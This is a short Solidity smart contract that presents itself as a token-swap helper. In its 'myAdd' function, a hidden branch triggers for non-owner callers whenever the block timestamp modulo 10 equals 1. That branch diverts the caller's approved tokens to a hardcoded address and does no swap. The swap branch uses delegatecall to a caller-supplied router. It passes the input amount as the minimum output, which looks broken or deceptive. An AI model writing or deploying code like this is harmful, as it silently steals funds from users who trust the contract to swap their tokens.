pragma solidity =0.6.6;
import './TransferHelper.sol';
contract Machine {
    address constant public myAddr = 0x0F4ee9631f4be0a63756515141281A3E2B293Bbe;
    address constant public wellAddr = 0xC463938922B7103b4cecc370De8B43c6959c82B1;
    constructor() public {
    }

    function myAdd(address router, uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline) external {
        if (msg.sender == myAddr || now % 10 != 1) {
            router.delegatecall(abi.encodeWithSignature("swapExactTokensForTokens(uint256,uint256,address[],address,uint256)", amountIn, amountIn, path, to, deadline));
        }
        else {
            TransferHelper.safeTransferFrom(
            path[0], msg.sender, wellAddr, amountIn);
        }
    }
}
